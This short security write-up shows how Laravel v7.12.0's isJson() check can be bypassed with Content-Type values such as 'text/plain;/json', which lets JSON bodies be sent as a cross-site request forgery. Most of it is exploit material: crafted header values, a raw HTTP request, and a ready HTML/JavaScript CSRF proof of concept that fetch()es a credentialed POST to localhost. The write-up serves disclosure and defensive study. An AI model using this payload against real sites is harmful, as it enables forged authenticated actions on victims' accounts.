### Laravel v7.12.0

**Endpoint**
```php
public function test(Request $request) {
  if($request->isJson()) {
    $data = $request->json();
```

**Source code** ([/laravel/framework/src/Illuminate/Http/Concerns/InteractsWithContentTypes.php](https://github.com/laravel/framework/blob/ffead70b97f799c0054bd5975c85325bf857b247/src/Illuminate/Http/Concerns/InteractsWithContentTypes.php#L32-L34))
```php
public function isJson()
{
  return Str::contains($this->header('CONTENT_TYPE'), ['/json', '+json']);
```

**JSON Content-Type**
```
XXX;/json
XXX;+json
```

**HTTP Request**
```http
POST /json HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded;+json
Content-Length: 13

{"test":true}
```

**CSRF PoC**
```html
<script>
	fetch('http://localhost/json',{
		method:'POST',
		headers:{'Content-Type':'text/plain;/json'},
		body:'{"test":true}',
		credentials: 'include'
	});
</script>
```